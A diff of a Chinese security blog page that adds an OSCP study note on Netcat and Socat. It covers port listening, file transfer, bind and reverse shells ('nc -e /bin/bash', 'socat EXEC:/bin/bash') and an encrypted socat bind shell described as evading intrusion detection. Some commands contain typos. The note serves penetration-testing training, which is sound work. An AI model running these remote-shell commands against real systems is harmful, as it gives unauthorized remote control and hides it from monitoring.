@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Linux提权之信息收集 | Falao&#39;s Blog</title>
+  <title>OSCP-实用工具 | Falao&#39;s Blog</title>
   <meta name="keywords" content="">
-  <meta name="description" content="Linux提权之信息收集 | Falao&#39;s Blog">
+  <meta name="description" content="OSCP-实用工具 | Falao&#39;s Blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="ID：法老职业：渗透测试工程师证书：OSCP&#x2F;CISP-PTE">
 <meta property="og:type" content="website">
@@ -539,9 +539,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-Linux提权之信息收集" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-OSCP-实用工具" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">Linux提权之信息收集</h1>
+        <h1 class="article-title">OSCP-实用工具</h1>
     
     <div class="article-meta">
         
@@ -551,7 +551,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="后渗透专题">后渗透专题</a>
+            <a  data-rel="计算机认证">计算机认证</a>
             
         </span>
         
@@ -559,7 +559,7 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2021-01-18 21:13:04'>2021-01-18 10:53</time>
+            Created At : <time class="date" title='Updated At: 2021-02-17 18:58:37'>2021-02-17 17:36</time>
         
     </div>
     <div class="article-meta">
@@ -581,7 +581,7 @@
     
     <div class="toc-ref">
     
-        
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Practical-Tools"><span class="toc-text">Practical Tools</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Netcat"><span class="toc-text">Netcat</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E7%AE%80%E4%BB%8B"><span class="toc-text">1. 简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E4%BE%A6%E5%90%ACTcp-Udp%E7%AB%AF%E5%8F%A3"><span class="toc-text">2. 侦听Tcp&#x2F;Udp端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E4%BD%BF%E7%94%A8Netcat%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6"><span class="toc-text">3. 使用Netcat传输文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-Netcat%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86"><span class="toc-text">4. Netcat远程管理</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-Netcat%E7%BB%91%E5%AE%9Ashell%E5%9C%BA%E6%99%AF"><span class="toc-text">1:) Netcat绑定shell场景</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%8F%8D%E5%90%91shell%E5%9C%BA%E6%99%AF"><span class="toc-text">2:) 反向shell场景</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-Exercises"><span class="toc-text">5.Exercises</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Socat"><span class="toc-text">Socat</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E8%BF%9E%E6%8E%A5%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E7%AB%AF%E5%8F%A3"><span class="toc-text">1. 连接远程服务器的端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-Socat%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93"><span class="toc-text">2. Socat文件传输</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-Socat%E5%8F%8D%E5%90%91shell"><span class="toc-text">3. Socat反向shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-Socat%E5%8A%A0%E5%AF%86%E7%BB%91%E5%AE%9Ashell"><span class="toc-text">4. Socat加密绑定shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-Exercises-1"><span class="toc-text">5. Exercises</span></a></li></ol></li></ol></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -597,7 +597,155 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        
+        <h1 id="Practical-Tools"><a href="#Practical-Tools" class="headerlink" title="Practical Tools"></a>Practical Tools</h1><blockquote>
+<p>经常使用工具：Netcat  Socat  Powershell Wireshark  Tcpdump</p>
+</blockquote>
+<h1 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h1><h4 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h4><blockquote>
+<p>我们可以使用客户端模式连接到任何Tcp/Udp端口，能够允许我们：</p>
+<ul>
+<li>检查端口是否打开或者关闭</li>
+<li>从监听端口的服务读取横幅</li>
+<li>手动连接到网络服务</li>
+</ul>
+</blockquote>
+<ul>
+<li><p>例1：检查Tcp端口110是否在其中一个服务器打开</p>
+<ul>
+<li>-n :跳过DNS名称解析</li>
+<li>-v :添加一些详细信息，目标地址和目标端口号</li>
+</ul>
+<pre><code class="shell">nc -nv 10.11.0.22 110</code></pre>
+</li>
+</ul>
+<h4 id="2-侦听Tcp-Udp端口"><a href="#2-侦听Tcp-Udp端口" class="headerlink" title="2. 侦听Tcp/Udp端口"></a>2. 侦听Tcp/Udp端口</h4><ul>
+<li>-l :指定监听器</li>
+<li>-p:指定端口号</li>
+</ul>
+<pre><code class="shell">server#nc -nlvp 4444
+client#nc -nv 10.11.0.22 4444</code></pre>
+<h4 id="3-使用Netcat传输文件"><a href="#3-使用Netcat传输文件" class="headerlink" title="3. 使用Netcat传输文件"></a>3. 使用Netcat传输文件</h4><blockquote>
+<p>Netcat还可以用于将文本和二进制文件从一台机器传输到另一台机器 Kali –&gt; windows</p>
+</blockquote>
+<pre><code class="shell">windows#nc -nlvp 4444 &gt; incoming.exe
+kali#locate wget.exe
+kali#nc -nv 10.11.0.22 4444 &lt; /use/share/wget.exe
+windows#nc -nlvp 4444 &gt; incoming.exe
+windows#incoming.exe -h</code></pre>
+<h4 id="4-Netcat远程管理"><a href="#4-Netcat远程管理" class="headerlink" title="4. Netcat远程管理"></a>4. Netcat远程管理</h4><blockquote>
+<p>-e 在建立或接受成功后执行程序</p>
+<p>启用时，此选项可以将可执行文件的输入，输出和错误消息重定向到Tcp/Udp端口而不是默认控制台</p>
+</blockquote>
+<h5 id="1-Netcat绑定shell场景"><a href="#1-Netcat绑定shell场景" class="headerlink" title="1:) Netcat绑定shell场景"></a>1:) Netcat绑定shell场景</h5><pre><code class="shell">windows#nc -nlvp 4444 -e cmd.exe
+kali#nc -nv 10.11.0.22 4444</code></pre>
+<h5 id="2-反向shell场景"><a href="#2-反向shell场景" class="headerlink" title="2:) 反向shell场景"></a>2:) 反向shell场景</h5><pre><code class="shell">windows#nc -lnvp 4444
+kali#nc -nv 10.11.0.22 -e /bin/bash</code></pre>
+<h4 id="5-Exercises"><a href="#5-Exercises" class="headerlink" title="5.Exercises"></a>5.Exercises</h4><ul>
+<li>实现windows与kali的聊天</li>
+<li>使用Netcat创建：<ul>
+<li>Kali到windows的反向shell</li>
+<li>windows到kali的反向shell</li>
+<li>在kali绑定shell，使用windows连接</li>
+<li>在windows绑定shell,使用kali连接</li>
+</ul>
+</li>
+<li>windows与kali互传文件</li>
+<li>开启防火墙练习</li>
+</ul>
+<h1 id="Socat"><a href="#Socat" class="headerlink" title="Socat"></a>Socat</h1><h4 id="1-连接远程服务器的端口"><a href="#1-连接远程服务器的端口" class="headerlink" title="1. 连接远程服务器的端口"></a>1. 连接远程服务器的端口</h4><pre><code class="shell">nc &lt;remote server's IP address&gt; 80
+socat TCP4:&lt;remote server's IP address&gt;:80</code></pre>
+<p>语法相似，但是Socat需要传输数据和STDIO之间和远程主机和协议。协议选项和端口号以冒号分割</p>
+<pre><code class="shell">sudo nc -lvp localhost 443
+sudo socat TCP-LISTEN:443 STDIO</code></pre>
+<h4 id="2-Socat文件传输"><a href="#2-Socat文件传输" class="headerlink" title="2. Socat文件传输"></a>2. Socat文件传输</h4><blockquote>
+<p>TCP4-LISTEN 指定IPV4侦听</p>
+<p>fork 会在与侦听器建立连接后创建一个子进程允许多线程</p>
+<p>file: 指定要传输文件的名称</p>
+</blockquote>
+<pre><code class="shell">kali#sudo socat TCP4-LISTEN:443,fork file:secret_password.txt</code></pre>
+<blockquote>
+<p>file: 指定要将文件保存到指定计算机上的本地文件名</p>
+<p>create 指定将创建一个新文件</p>
+</blockquote>
+<pre><code class="shell">windows#socat TCP4:10.11.0.22:443 file:received_secret_password.txt,create </code></pre>
+<h4 id="3-Socat反向shell"><a href="#3-Socat反向shell" class="headerlink" title="3. Socat反向shell"></a>3. Socat反向shell</h4><blockquote>
+<p>-d -d :增加详细性（显示致命错误，警告和通知）</p>
+<p>STDIO：使用stdio进行连接到Tcp套接字的标准输出</p>
+</blockquote>
+<pre><code class="shell">windows#socat -d -d TCP4-LISTEN:443 STDIO</code></pre>
+<blockquote>
+<p>EXEC：建立远程连接后，给定指定程序，类似于nc -e</p>
+</blockquote>
+<pre><code class="shell">kali#socat TCP4:10.11.0.22:443 EXEC:/bin/bash</code></pre>
+<h4 id="4-Socat加密绑定shell"><a href="#4-Socat加密绑定shell" class="headerlink" title="4. Socat加密绑定shell"></a>4. Socat加密绑定shell</h4><blockquote>
+<p>向绑定shell添加加密，我们可以使用安全套接字认证这个级别的加密将有助于规避入侵检测系统（IDS）隐藏敏感信息</p>
+</blockquote>
+<p>Openssl工具参数<span class="github-emoji"><span>🐙</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f419.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>req</td>
+<td>启动新的证书签名请求</td>
+</tr>
+<tr>
+<td>-newkey</td>
+<td>生成一个新的私钥</td>
+</tr>
+<tr>
+<td>rsa2048</td>
+<td>使用密钥长度为2048位的RSA加密</td>
+</tr>
+<tr>
+<td>-nodes</td>
+<td>存储没有密码保护的私钥</td>
+</tr>
+<tr>
+<td>-keyout</td>
+<td>将密钥保存到文本</td>
+</tr>
+<tr>
+<td>-xseq</td>
+<td>输出自签名证书而不是证书请求</td>
+</tr>
+<tr>
+<td>-days</td>
+<td>以天为单位设置有效期</td>
+</tr>
+<tr>
+<td>-out</td>
+<td>将证书保存到文件中</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>一旦我们生成密钥，我们将把证书和他的私钥放在一个文件中，我们将最终用来加密我们绑定的shell</p>
+</blockquote>
+<p><strong>步骤一</strong></p>
+<pre><code class="shell">openssl req -newkey ras:2048 -nodes -keyout bind_shell.key -x509 -day 362 -out bind_shell.crt</code></pre>
+<blockquote>
+<p>转换为Socat会接受的格式.pem文件在创建加密的socat侦听器</p>
+</blockquote>
+<p><strong>步骤二</strong></p>
+<pre><code class="shell">cat bind_shell.key bind_shell.crt &gt; bind_shell.pem</code></pre>
+<p><strong>步骤三</strong></p>
+<blockquote>
+<p>openssl-listen  创建侦听器</p>
+<p>cert=bind_shell.pem  指定证书文件</p>
+<p>verify = 0     禁用SSL证书验证</p>
+</blockquote>
+<pre><code class="shell">sudo socat openssl-listen:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash</code></pre>
+<p><strong>步骤四</strong></p>
+<pre><code class="shell">socat openssl:10.0.11.22:443,verify=0</code></pre>
+<h4 id="5-Exercises-1"><a href="#5-Exercises-1" class="headerlink" title="5. Exercises"></a>5. Exercises</h4><ul>
+<li>使用socat传输文件，kali–&gt;windows</li>
+<li>使用socat穿件一个从windows–&gt;kali反向加密shell</li>
+<li>在windows上创建加密的绑定shell，试着从kali连接，没有加密还可以用?</li>
+<li>在windows上创建未加密的socat绑定shell,使用连接到shell的NC，有用吗？</li>
+</ul>
+
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 2662904153@qq.com </span>
     </div>
